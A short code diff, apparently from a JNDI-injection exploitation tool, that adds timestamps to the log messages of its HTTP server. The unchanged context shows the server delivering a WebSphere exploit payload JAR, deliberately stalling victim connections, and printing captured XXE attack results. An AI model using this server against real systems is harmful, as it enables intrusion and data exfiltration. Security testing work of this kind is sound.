@@ -12,6 +12,7 @@ import java.net.InetSocketAddress;
 import java.util.concurrent.Executors;
 import java.util.jar.JarOutputStream;
 import java.util.zip.ZipEntry;
+import java.sql.Timestamp;
 
 import static org.apache.commons.text.StringEscapeUtils.escapeJava;
 
@@ -21,7 +22,8 @@ public class HttpServer implements HttpHandler {
 	byte[] exportJar;
 
 	public static void start() throws Exception {
-		System.out.println("Starting HTTP server on 0.0.0.0:" + Config.httpPort);
+		Timestamp timestamp = new Timestamp(System.currentTimeMillis());
+		System.out.println(timestamp + " Starting HTTP server on 0.0.0.0:" + Config.httpPort);
 		com.sun.net.httpserver.HttpServer httpServer = com.sun.net.httpserver.HttpServer.create(new InetSocketAddress(Config.httpPort), 10);
 		httpServer.createContext("/", new HttpServer());
 		httpServer.setExecutor(Executors.newCachedThreadPool());
@@ -69,7 +71,8 @@ public class HttpServer implements HttpHandler {
 	public void handle(HttpExchange httpExchange) {
 		try {
 			String path = httpExchange.getRequestURI().getPath();
-			System.out.println("new http request from " + httpExchange.getRemoteAddress() + " asking for " + path);
+			Timestamp timestamp = new Timestamp(System.currentTimeMillis());
+			System.out.println(timestamp + " new http request from " + httpExchange.getRemoteAddress() + " asking for " + path);
 
 			switch (path) {
 				case "/xExportObject.class":
@@ -83,9 +86,9 @@ public class HttpServer implements HttpHandler {
 					//payload for artsploit.controllers.WebSphere1-2
 					httpExchange.sendResponseHeaders(200, exportJar.length+1);
 					httpExchange.getResponseBody().write(exportJar);
-					System.out.println("Stalling connection for 60 seconds");
+					System.out.println(timestamp + " Stalling connection for 60 seconds");
 					Thread.sleep(60000);
-					System.out.println("Release stalling...");
+					System.out.println(timestamp + " Release stalling...");
 					break;
 
 				case "/upload.wsdl":
@@ -130,7 +133,7 @@ public class HttpServer implements HttpHandler {
 					Object request = FieldUtils.readField(exchangeImpl, "req", true);
 					String startLine = (String) FieldUtils.readField(request, "startLine", true);
 
-					System.out.println("\u001B[31mxxe attack result: " + startLine + "\u001B[0m");
+					System.out.println(timestamp + "\u001B[31mxxe attack result: " + startLine + "\u001B[0m");
 					httpExchange.sendResponseHeaders(200, 0);
 					break;
 
